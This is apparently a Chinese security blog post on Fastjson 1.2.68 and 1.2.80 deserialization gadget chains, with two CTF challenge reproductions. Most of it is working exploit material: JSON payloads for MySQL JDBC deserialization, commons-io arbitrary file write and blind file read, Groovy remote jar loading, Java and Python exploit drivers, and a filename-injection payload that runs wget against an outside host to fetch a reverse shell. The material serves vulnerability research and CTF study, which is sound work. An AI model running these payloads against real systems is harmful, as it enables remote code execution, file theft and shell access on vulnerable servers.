title: Fastjson高版本的奇技淫巧
author: bmth
tags:
  - fastjson
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/38022679056243789c9a7913e6ab82c1.png'
cover: 'https://img-blog.csdnimg.cn/38022679056243789c9a7913e6ab82c1.png'
date: 2022-10-19 14:41:00
---
![](https://img-blog.csdnimg.cn/38022679056243789c9a7913e6ab82c1.png)

众所周知fastjson一般都是打JNDI的，这也是最常用的一种方法，但是高版本的话autoType默认为false，不支持，这里就需要通过一些其他的方法来rce了

在去年的黑帽大会上分享了fastjson1.2.68的几种利用链，今年看到浅蓝师傅关于fastjson1.2.80分享的议题，决定两个一起学习一下

## BlackHat2021(fastjson 1.2.68)
fastjson 1.2.68可以利用java.lang.AutoCloseable绕过checkAutotype

利用前提：
- 必须继承 AutoCloseable
- 必须具有默认构造函数或带符号的构造函数，否则无法正确实例化
- 不在黑名单中
- 可以引起 rce 、任意文件读写或其他高风险影响
- gadget的依赖应该在原生jdk或者广泛使用的第三方库中

### Mysql JDBC
先配置一下mysql
```
<dependency>
	<groupId>mysql</groupId>
	<artifactId>mysql-connector-java</artifactId>
	<version>5.1.30</version>
</dependency>
```
可以看到JDBC4Connection是满足条件的
![](https://img-blog.csdnimg.cn/86ec1311c0274224ac995ff1cb640d59.png)

可以打jdbc的反序列化，简单的复现一下，打一下cc5
使用工具 [https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

```json
//Mysql connector 5.1.11-5.1.48
{"name": {"@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection", "hostToConnectTo": "127.0.0.1", "portToConnectTo": 3306, "info": { "user": "CommonsCollections5", "password": "pass", "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor", "autoDeserialize": "true", "NUM_HOSTS": "1" }}

//Mysql connector 6.0.2 or 6.0.3
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy": {"connectionString":{"url":"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections5"}}}

//Mysql connector 8.0.19
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters":[{"host":"127.0.0.1"}], "slaves":[],"properties":{"host":"127.0.0.1","user":"CommonsCollections5","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
```
![](https://img-blog.csdnimg.cn/84e394cdfb534934a068c319f86fc045.png)
参考：[Fastjson MySQL gadget复现](https://sumsec.me/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html)


### commons-io写文件
首先是一条 openjdk >= 11 的读写链
>这里分享一条我找到的不需要三方库的链, 注意虽然不需要三方库, 但只能在 openjdk >= 11 下利用, 因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的, 所以可以多利用一些内部类, 但是 openjdk 8, 包括 oracle jdk 都是不带这些信息的, 导致无法反序列化, 自然也就无法利用. 所以相对比较鸡肋, 仅供学习. orz

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```
这里如何构造文件内容呢，可以使用python进行构造
```python
from itsdangerous import base64_encode
import zlib
cc='Test123'.encode()
ccc=zlib.compress(cc)
print(len(ccc))
print(base64_encode(ccc))
```
![](https://img-blog.csdnimg.cn/cd44723d3a1f42d495b95aaf6e7f3e02.png)

然后修改array和limit即可写入文件，append为false是覆盖内容，为true是追加内容
![](https://img-blog.csdnimg.cn/9fca361d11ec402faf8c7c400c029ecf.png)

可以看到成功写入文件，但是由于版本限制的问题过于鸡肋

最后voidfyoo师傅找到了Commons IO 2.x的写文件链
注意这里写入内容的长度必须要>8192，不然会失败，并且实际写入的内容只有前8192个字符，后面的不会写入
commons-io 2.0 - 2.6 版本：
```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```
可以发现在JDK8版本下成功写入文件，如果能写jsp，那么就可以直接getshell了，但是如果不存在写jsp的条件呢，比如说springboot，那么就需要写jar文件了：[Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索 ](https://landgrey.me/blog/22/)

总结一下就是 jvm 为了避免一下加载太多暂时用不到或者以后都用不到的类，不会在一开始运行时把所有的 JDK HOME 目录下自带的 jar 文件全部加载到类中，存在 懒加载 行为，并且发现程序代码中如果没有使用`Charset.forName("GBK")`类似的代码，默认就不会加载到`/jre/lib/charsets.jar`文件，那么我们控制类初始化，就可以加载恶意的charsets.jar实现rce了

存在一条写二进制的链
![](https://img-blog.csdnimg.cn/d4a25889d5e6431883ac046297f3fbd3.png)

需要满足：`fastjson<=1.2.68 and commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6`
最后Skay师傅的exp为：
```java
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import com.alibaba.fastjson.JSON;

public class payload_AspectJ_writefile {
    public static void main(String[] args){
        byte[] bom_buffer_bytes = readFileInBytesToString("C:/Users/bmth/Desktop/作业/CTF学习/java学习/fastjson/src/main/java/exp/Blackhat2021/1.txt");
        //写文本时要填充数据
        String so_content = new String(bom_buffer_bytes);
        for (int i=0;i<8192;i++){
            so_content = so_content+"a";
        }
        String base64_so_content = Base64.getEncoder().encodeToString(so_content.getBytes());
//        String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
        byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
//        byte[] big_bom_buffer_bytes = base64_so_content.getBytes();
        String payload = String.format("{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
                "  \"delegate\":{\n" +
                "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "    \"input\":{\n" +
                "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                "      \"in\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "        \"charset\":\"utf-8\",\n" +
                "        \"bufferSize\": 1024,\n" +
                "        \"s\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
                "      },\n" +
                "      \"doEncode\":false,\n" +
                "      \"lineLength\":1024,\n" +
                "      \"lineSeparator\":\"5ZWKCg==\",\n" +
                "      \"decodingPolicy\":0\n" +
                "    },\n" +
                "    \"branch\":{\n" +
                "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "      \"targetPath\":\"%2$s\"\n" +
                "    },\n" +
                "    \"closeBranch\":true\n" +
                "  },\n" +
                "  \"include\":true,\n" +
                "  \"boms\":[{\n" +
                "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                  \"charsetName\": \"UTF-8\",\n" +
                "                  \"bytes\":" +"%3$s\n" +
                "                }],\n" +
                "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
                "}",base64_so_content, "C:/Users/bmth/Desktop/作业/CTF学习/java学习/fastjson/src/main/java/exp/Blackhat2021/3.txt", Arrays.toString(big_bom_buffer_bytes));
        System.out.println(payload);
        JSON.parse(payload);
    }

    public static byte[] readFileInBytesToString(String filePath) {
        final int readArraySizePerRead = 4096;
        File file = new File(filePath);
        ArrayList<Byte> bytes = new ArrayList<>();
        try {
            if (file.exists()) {
                DataInputStream isr = new DataInputStream(new FileInputStream(file));
                byte[] tempchars = new byte[readArraySizePerRead];
                int charsReadCount = 0;

                while ((charsReadCount = isr.read(tempchars)) != -1) {
                    for(int i = 0 ; i < charsReadCount ; i++){
                        bytes.add (tempchars[i]);
                    }
                }
                isr.close();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return toPrimitives(bytes.toArray(new Byte[0]));
    }

    static byte[] toPrimitives(Byte[] oBytes) {
        byte[] bytes = new byte[oBytes.length];

        for (int i = 0; i < oBytes.length; i++) {
            bytes[i] = oBytes[i];
        }
        return bytes;
    }
}
```
测试发现写入的文件存在问题，只能写入8kb的数据，导致文件不是一个完整的jar包
![](https://img-blog.csdnimg.cn/ac1b42c128bf4cca9b08a336735d35ef.png)

仅提供一个思路

### commons-io读文件
前提是存在数据的回显，比如return 反序列化后的数据
```json
{
    "abc": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///C:/Users/bmth/Desktop/作业/CTF学习/java学习/fastjson/src/main/java/exp/Blackhat2021/1.txt"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [{
            "charsetName": "UTF-8",
            "bytes": [66]
        }]
    },
    "address": {
        "$ref": "$.abc.BOM"
    }
}
```
可以看到为true的时候返回
![](https://img-blog.csdnimg.cn/c3e21c102edc4a36a1bc84cb887b1b08.png)
为false的时候返回
![](https://img-blog.csdnimg.cn/59899c139b384c69b998397ab76c72e3.png)

说明我们可以盲注出文件的内容，并且调用的是URL对象，可以使用file或者netdoc遍历目录



参考：
[Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)
[fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记](https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/)
[fastjson 1.2.68 反序列化漏洞 gadget 的一种挖掘思路](https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA)


可参考文章：
[Blackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用](https://paper.seebug.org/1698/)
[关于blackhat2021披露的fastjson1.2.68链](https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg)


## KCon2022(fastjson 1.2.80)
1.2.68的修复方式非常的简单粗暴，将`java.lang.Runnable`、`java.lang.Readable`和`java.lang.AutoCloseable`加入了黑名单，那么1.2.80用的就是另一个期望类：异常类Throwable

实例化类属性的对应类后，fastjson会将其加入到类缓存mappings中，从缓存中取类在修复前不会判断autoTypeSupport，所以绕过了类白名单机制扩展出更多的可用类

利用流程：
1. 指定显式期望类，实例化XXXException并被加入类缓存
2. 通过XXXException中可控的属性名/参数名，由隐式类间关系实例化并被加入类缓存
 3. 直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存

### Groovy
利用条件
- fastjson版本： 1.2.76 <= fastjson < 1.2.83
- 存在groovy依赖

最简单也最可能达成的一条链
![](https://img-blog.csdnimg.cn/33230aa38e4e4b448b519a06a5c071e8.png)


第一步将`org.codehaus.groovy.control.ProcessingUnit` 加入白名单：
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```
第二步远程类加载：
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:8000/attack-1.jar"
    }
}
```
生成exp：[https://github.com/Lonely-night/fastjsonVul/](https://github.com/Lonely-night/fastjsonVul/)
![](https://img-blog.csdnimg.cn/f56bccc20c9b49dc82449f854a311899.png)

修改为windows的弹计算器，然后install即可，最后的exp：
```java
import com.alibaba.fastjson.JSON;
import java.io.IOException;

public class groovy {
    public static void main(String[] args) throws IOException {
        String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
            "    \"unit\":{}\n" +
            "}";

        String poc2 = "{\n" +
            "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
            "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
            "    \"config\":{\n" +
            "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
            "        \"classpathList\":\"http://127.0.0.1:8000/attack-1.jar\"\n" +
            "    }\n" +
            "}";

        System.out.println(poc1);
        System.out.println(poc2);
        try {
            JSON.parse(poc1);
        } catch (Exception e) {}
        JSON.parse(poc2);
    }
}
```
依次传入即可
![](https://img-blog.csdnimg.cn/c81c0a6cb2a84c33b967d2d3c2876548.png)

### aspectj
fastjson1.2.73-1.2.80，依赖aspectjtools
![](https://img-blog.csdnimg.cn/64487226b26b4446a3e702cc12f0b60f.png)
分三次打
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```
```json
{
    "@type":"java.lang.Class",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",
             {
                "@type":"java.lang.String"
                "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
                "newAnnotationProcessorUnits":[{}]
            }
        }
    }
```
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"c:/windows/win.ini"
    }
}
```
![](https://img-blog.csdnimg.cn/fcdfb34a51af45e0873bbe0cd985fe0a.png)

这种可以打印结果的链，都可以利用`java.lang.Character`进行报错回显，或者利用`java.net.Inet4Address`进行dnslog回显，但由于要拼接进各种特殊符号，所以这个dnslog回显也仅存在理论当中(mac平台)



参考：
[Fastjson1.2.80漏洞复现](https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
[fastjson 1.2.80 漏洞分析](https://y4er.com/posts/fastjson-1.2.80/)
[Fastjson CVE-2022-25845 漏洞复现](https://moonsec.top/articles/112)
[https://github.com/su18/hack-fastjson-1.2.80](https://github.com/su18/hack-fastjson-1.2.80)


## 题目复现
### [深育杯2021]还是你熟悉的fastjson吗
反编译看到存在fastjson1.2.67和commons-io 2.6，这两个重点关注一下
![](https://img-blog.csdnimg.cn/6ee7e07f142143e1b55586d3c47ca3fe.png)

随后看到源码，存在一个fastjson反序列化，并且会return结果，然后如果在`/tmp`目录下存在`.8.bak`结尾的文件时会有一个命令执行
![](https://img-blog.csdnimg.cn/ecc476d039674dac812147ec744830b6.png)

#### 方法一
如果文件名可控，就可以任意命令执行了，即：
```bash
test.8.bak
bash -c cp$IFS/tmp/test.8.bak$IFS/tmp/test.8

a;wget${IFS}192.168.111.1:8000;#test.8.bak
bash -c cp$IFS/tmp/a;wget${IFS}192.168.111.1:8000;#test.8.bak$IFS/tmp/a;wget${IFS}192.168.111.1:8000;#test.8
```
那么就需要往`/tmp`目录下写文件，使用`Commons IO 2.x`写文件的链子
参考：[Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)
最终的exp为：
```java
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaa"},
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/a;wget${IFS}192.168.111.1:8000;#test.8.bak",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```
然后访问copy即可下载index.html，内容为反弹shell的代码

![](https://img-blog.csdnimg.cn/1ba774cb06134f7fb31d36797d877948.png)
最后通过sh执行index.html即可反弹shell，写入的文件名为：`/tmp/a;sh${IFS}index.html;#test.8.bak` 
![](https://img-blog.csdnimg.cn/8d46662e6362441b9425249f25ea3670.png)

#### 方法二
看到官方wp，发现还可以目录遍历和文件读取
>根据这getBom 方法的代码来看，它就是先把 delegate 输入流的字节码转成 int 数组，然后拿 ByteOrderMark 里的 bytes 挨个字节遍历去比对，如果遍历过程有比对错误的 getBom 就会返回一个 null，如果遍历结束，没有比对错误那就会返回一个 ByteOrderMark 对象。所以这里文件读取 成功的标志应该是 getBom 返回结果不为 null

并且由于传入的是一个 URL 对象。这就意味着file jar http 等协议都可以使用
poc：
```java
{
    "abc": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///D:/test/1.txt"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [{
            "charsetName": "UTF-8",
            "bytes": [49]
        }]
    },
    "address": {
        "$ref": "$.abc.BOM"
    }
}
```
最后的官方脚本如下：
```python
import requests
import os
import sys
import re
import string
 
host = "http://192.168.111.178:8080"
 
def step1():
    global host
    result = []
    def getArrayData(ch):
        out = []
        for c in result:
            out.append(str(ord(c)))
        out.append(str(ord(ch)))
        return ','.join(out)
    def poc(ch):
        url = '/hello'
        jsonstr = '{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"netdoc:///tmp/"},"charsetName":"utf-8","bufferSize":1024},"boms":[{"charsetName":"utf-8","bytes":[%s]}]},"address":{"$ref":"$.abc.BOM"}}'
        data = {
            'data': jsonstr % getArrayData(ch)
        }
        proxy = {'http':'127.0.0.1:8080'}
        proxy = {}
        rsp = requests.post(host+url, data=data, proxies=proxy)
        if "bytes" in rsp.text:
            return True
        else:
            return False
    while True:
        for ch in string.printable+'\r\n':
            if poc(ch):
                result.append(ch)
                print('step1>', ''.join(result))
                break
 
step1()
```
![](https://img-blog.csdnimg.cn/968b59d209b44275bf0c2e0d4d0ffd51.png)

如果遍历出来flag那么可以直接file读取flag了
这里继续复现，本地测试发现如果commons-io版本为2.6，那么就会报错：
```
create instance error, null, public org.apache.commons.io.input.CharSequenceInputStream(java.lang.CharSequence,java.lang.String,int)
```
无法成功的写入二进制文件



参考文章：
[[原创]2021深育杯线上初赛官方WriteUp](https://bbs.pediy.com/thread-270353.htm)
[ctf中的java题目](https://tttang.com/archive/1331/)

### [蓝帽杯2022决赛]赌怪
发现是华夏erp的项目，可以直接注册一个用户，然后存在反序列化漏洞
并且项目中存在mysql-connector-java 5.1.30和cc3.2.1链
![](https://img-blog.csdnimg.cn/b82553a505ba4b3982aad40ffa78655b.png)
![](https://img-blog.csdnimg.cn/b4b71a097b54489b8909571bb77ba15a.png)

看到这那么思路就很简单了，直接打fastjson的mysql反序列化

开启mysql恶意服务
![](https://img-blog.csdnimg.cn/b929539397444ec5a9fc5e4d64b88423.png)

payload：
```json
{ "name": { "@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection", "hostToConnectTo": "42.192.42.48", "portToConnectTo": 3306, "info": { "user": "CommonsCollections6", "password": "pass", "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor", "autoDeserialize": "true", "NUM_HOSTS": "1" } }
```
在search处传入，注意url编码
![](https://img-blog.csdnimg.cn/878c3a6f3e08473da0cb935f50363406.png)

成功传输数据，cc6的内容为反弹shell
![](https://img-blog.csdnimg.cn/08c2f980ee2e4d36a36da41862ddfb32.png)

成功接收到shell，获得flag
![](https://img-blog.csdnimg.cn/e5238072472e44329d944bb116d10d1b.png)

修复的话也很简单，直接替换为高版本的fastjson就可以了

参考：
[SpringBoot框架华夏ERP源码审计](https://www.cnblogs.com/bmjoker/p/14856437.html)
[华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行](https://cn-sec.com/archives/387212.html)
